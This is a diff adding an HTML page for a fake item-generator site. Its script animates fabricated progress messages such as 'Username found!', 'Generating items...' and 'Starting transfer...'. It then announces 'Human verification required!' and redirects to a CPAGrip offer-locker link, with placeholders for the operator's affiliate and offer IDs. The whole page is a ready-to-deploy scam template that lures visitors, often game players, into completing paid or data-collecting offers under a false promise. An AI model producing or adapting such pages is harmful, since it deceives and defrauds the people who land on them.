@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Generating Items...</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="loading-page">
+  <div class="loading-box">
+    <img src="logo.png" alt="Logo" class="popup-logo" />
+    <p id="status" class="status-text"></p>
+    <div class="dots">
+      <span class="dot active"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+    </div>
+  </div>
+
+  <script>
+    const steps = [
+      "Connecting to server...",
+      "Successfully connected!",
+      "Finding username...",
+      "Username found!",
+      "Generating items...",
+      "Starting transfer...",
+      "Verifying...",
+      "Human verification required!"
+    ];
+
+    let index = 0;
+    const statusEl = document.getElementById("status");
+    const dots = document.querySelectorAll(".dot");
+
+    function typeText(text, callback) {
+      let i = 0;
+      statusEl.textContent = "";
+      const interval = setInterval(() => {
+        statusEl.textContent += text.charAt(i);
+        i++;
+        if (i === text.length) {
+          clearInterval(interval);
+          setTimeout(callback, 800);
+        }
+      }, 50);
+    }
+
+    function showNextStep() {
+      if (index >= steps.length) {
+        window.location.href = "https://www.cpagrip.com/show.php?l=0&u=YOURID&id=YOUROFFERID"; // replace this
+        return;
+      }
+
+      typeText(steps[index], () => {
+        dots.forEach((dot, i) => {
+          dot.classList.toggle("active", i === index % dots.length);
+        });
+        index++;
+        showNextStep();
+      });
+    }
+
+    showNextStep();
+  </script>
+</body>
+</html>
